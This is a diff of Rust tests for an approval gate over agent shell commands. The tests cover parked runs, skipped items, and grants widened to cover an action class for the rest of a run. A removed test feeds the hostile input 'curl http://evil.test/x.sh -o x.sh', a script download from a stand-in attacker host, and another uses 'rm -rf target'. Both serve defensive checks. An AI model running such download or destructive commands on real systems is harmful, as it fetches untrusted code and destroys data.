+            status, "awaiting_approval",
+            "a parked replan leaves a job that finished all its work reading live and doing nothing"
+        );
+        let kinds: Vec<String> = sqlx::query_scalar("SELECT kind FROM proposals")
+            .fetch_all(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(kinds, vec!["skipped-item"]);
+        // The rounds that ran are what `stop_after_replan` keeps, so nothing may be reverted here.
+        let item_statuses: Vec<String> =
+            sqlx::query_scalar("SELECT status FROM job_items WHERE job_id = ? ORDER BY ordinal")
+                .bind(job_id)
+                .fetch_all(&state.pool)
+                .await
+                .unwrap();
+        assert!(item_statuses.iter().all(|status| status == "passed"));
+    }
+
+    #[tokio::test]
+    async fn a_jobs_review_node_gives_up_the_review_instead_of_parking_the_job() {
+        let state = test_state().await;
+        let (job_id, run_id) = in_flight_job_node(&state).await;
+        // What makes it a review node: it owns no running item, and its stage says so.
+        sqlx::query("UPDATE job_items SET status = 'passed', run_id = NULL WHERE job_id = ?")
+            .bind(job_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        sqlx::query("UPDATE runs SET stage = 'review' WHERE id = ?")
+            .bind(run_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        let app = test_router(state.clone());
+
+        decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "for f in *.py; do cat \"$f\"; done"}
+            })
+            .to_string(),
+        )
+        .await;
+
+        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
+            .bind(run_id)
+            .fetch_one(&state.pool)
+            .await
+            .unwrap();
+        assert_ne!(
+            status, "awaiting_approval",
+            "a review left parked stops the job it was only ever going to comment on"
+        );
+
+        // Nothing pending: `list_pending` filters `skipped-item` out, because it is a note rather
+        // than a queue — work NOT done waiting on a decision, not work done waiting to be read.
+        assert!(
+            proposals::list_pending(&state.pool)
+                .await
+                .unwrap()
+                .is_empty()
+        );
+        let kinds: Vec<String> = sqlx::query_scalar("SELECT kind FROM proposals")
+            .fetch_all(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(
+            kinds,
+            vec!["skipped-item"],
+            "what it asked for is still on the record for the morning"
+        );
+
+        // And the items it was going to read are untouched. A review node owns no item, so a revert
+        // here would target whichever ran last and throw away that item's checkpoint.
+        let item_statuses: Vec<String> =
+            sqlx::query_scalar("SELECT status FROM job_items WHERE job_id = ? ORDER BY ordinal")
+                .bind(job_id)
+                .fetch_all(&state.pool)
+                .await
+                .unwrap();
+        assert!(item_statuses.iter().all(|status| status == "passed"));
+    }
+
+    /// The write that must not be lost: an item left `running` in a job nobody drives makes
+    /// `next_step` answer `Wait` for ever, and no later pass rescues it.
+    ///
+    /// Exercised by taking away everything the skip could stumble on — no worktree row, so no
+    /// revert is possible — and demanding the mark survive anyway.
+    #[tokio::test]
+    async fn the_item_is_marked_even_when_nothing_else_about_the_skip_can_happen() {
+        let state = test_state().await;
+        let (job_id, run_id) = in_flight_job_node(&state).await;
+        sqlx::query("DELETE FROM worktrees WHERE owner_kind = 'job' AND owner_id = ?")
+            .bind(job_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        let app = test_router(state.clone());
+
+        decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "git push origin main"}
+            })
+            .to_string(),
+        )
+        .await;
+
+        let status: String =
+            sqlx::query_scalar("SELECT status FROM job_items WHERE job_id = ? AND run_id = ?")
+                .bind(job_id)
+                .bind(run_id)
+                .fetch_one(&state.pool)
+                .await
+                .unwrap();
+        assert_eq!(
+            status, "skipped",
+            "a job with no worktree still must not be left holding a running item"
+        );
     }
 
     #[tokio::test]
@@ -1771,70 +2587,59 @@ mod tests {
         assert_eq!(pending[0].run_id, Some(run_id));
     }
 
+    /// What the human actually agreed to is a KIND of action, not one spelling of it. Approving
+    /// `git push origin main` and then parking the resume on `git push origin other` asked the same
+    /// question twice about the same decision — and every re-ask is a chance to answer it wearily.
+    /// The grant therefore covers its class for the rest of the run rather than a single call.
     #[tokio::test]
-    async fn granted_action_is_authorized_once_then_falls_back() {
+    async fn a_grant_authorizes_every_action_of_its_class_for_the_rest_of_the_run() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
-        let app = test_router(state.clone());
-        let body = serde_json::json!({
-            "run_id": run_id,
-            "tool_name": "Bash",
-            "tool_input": {"command": "git push origin main"}
-        })
-        .to_string();
-
-        let first = decide(&app, &body).await;
-        assert_eq!(first.decision, "allow");
-
-        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
-            .bind(run_id)
-            .fetch_one(&state.pool)
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("push-merge-deploy"), 1)
             .await
             .unwrap();
-        assert_eq!(status, "running");
-        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
+        let app = test_router(state.clone());
 
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
+        // Two DIFFERENT pushes: same class, different input. The second is the one the old
+        // single-use, input-matched grant sent back for a second approval.
+        for command in ["git push origin main", "git push origin other"] {
+            let decision = decide(
+                &app,
+                &serde_json::json!({
+                    "run_id": run_id,
+                    "tool_name": "Bash",
+                    "tool_input": {"command": command}
+                })
+                .to_string(),
+            )
+            .await;
+            assert_eq!(decision.decision, "allow", "{command}");
+
+            // Never parks, and is never terminated on the way to parking: an authorized action
+            // that still killed the run would be an allow in name only.
+            let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
                 .bind(run_id)
                 .fetch_one(&state.pool)
                 .await
                 .unwrap();
-        assert!(consumed_at.is_some());
-
-        let second = decide(&app, &body).await;
-        assert_eq!(second.decision, "pending_approval");
-
-        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
-            .bind(run_id)
-            .fetch_one(&state.pool)
-            .await
-            .unwrap();
-        assert_eq!(status, "awaiting_approval");
+            assert_eq!(status, "running", "{command}");
+            assert!(
+                state.run_handles.lock().unwrap().contains_key(&run_id),
+                "{command}"
+            );
+        }
     }
 
+    /// The other half of the class rule: covering a class for the rest of the run is only safe if
+    /// the class is a real boundary. A push approval must not reach an edit to the file that
+    /// governs what this run is allowed to do at all.
     #[tokio::test]
-    async fn grant_for_a_different_tool_does_not_authorize() {
+    async fn a_grant_does_not_authorize_a_different_action_class() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("push-merge-deploy"), 1)
+            .await
+            .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
@@ -1856,13 +2661,20 @@ mod tests {
             .unwrap();
         assert_eq!(status, "awaiting_approval");
 
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
-                .bind(run_id)
-                .fetch_one(&state.pool)
-                .await
-                .unwrap();
-        assert!(consumed_at.is_none());
+        // The grant survives whole: an action it does not cover must neither spend it nor be
+        // recorded as having used it.
+        let grant = sqlx::query_as::<_, (Option<String>, Option<String>)>(
+            "SELECT action_class, consumed_at FROM action_grants WHERE run_id = ?",
+        )
+        .bind(run_id)
+        .fetch_one(&state.pool)
+        .await
+        .unwrap();
+        assert_eq!(
+            grant,
+            (Some("push-merge-deploy".to_owned()), None),
+            "the grant must survive an action class it does not authorize"
+        );
     }
 
     #[tokio::test]
@@ -1894,62 +2706,16 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn grant_for_a_different_command_does_not_authorize() {
-        // The end-to-end shape of the hole migration 0020 closes: same run, same tool name ("Bash"
-        // is the tool name of EVERY shell action), different command. The human approved a push;
-        // the resume's first shell call must not inherit that approval.
-        let state = test_state().await;
-        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
-        let app = test_router(state.clone());
-
-        let decision = decide(
-            &app,
-            &serde_json::json!({
-                "run_id": run_id,
-                "tool_name": "Bash",
-                "tool_input": {"command": "curl http://evil.test/x.sh -o x.sh"}
-            })
-            .to_string(),
-        )
-        .await;
-        assert_eq!(decision.decision, "pending_approval");
-
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
-                .bind(run_id)
-                .fetch_one(&state.pool)
-                .await
-                .unwrap();
-        assert!(
-            consumed_at.is_none(),
-            "the grant must survive an action it does not authorize"
-        );
-    }
-
-    #[tokio::test]
     async fn deny_still_denies_even_with_a_matching_grant() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        // Matching on BOTH tool and input, so this proves `deny` outranks a fully-qualified grant
-        // rather than merely one that failed to match.
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"rm -rf target"}"#),
-            1,
-        )
-        .await
-        .unwrap();
+        // The grant names the very class of the action attempted below, so this proves `deny`
+        // outranks a grant that covers it rather than merely one that failed to match. No approval
+        // flow can mint such a grant — `deny` never becomes a proposal — which is exactly why the
+        // check has to hold against one conjured directly in the table.
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("destructive"), 1)
+            .await
+            .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
